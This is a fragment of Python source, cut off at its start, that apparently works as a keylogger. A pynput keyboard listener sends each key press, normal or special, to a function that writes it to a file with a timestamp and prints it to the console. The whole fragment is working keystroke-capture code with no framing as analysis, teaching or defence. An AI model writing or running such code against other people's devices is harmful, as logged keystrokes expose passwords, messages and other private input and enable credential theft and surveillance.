        try: # handles normal keys [a - z] and [0 - 9]  
            f.write(str(datetime.now()) + ', ' + str(key) + '\n')   
            print('Normal Key {0}'.format(key))  
        except AttributeError:  # handles special keys such as alt, enter etc.           
            f.write(str(datetime.now()) + ', ' + str(key) + '\n')    
            print('Special Key {0}'.format(key)) 

def on_press(key):
    try:  # for normal keys
        keylogger(key.char)
    except: #for special character keys 
        keylogger(key)

with keyboard.Listener(on_press=on_press) as listener:
   listener.join()  
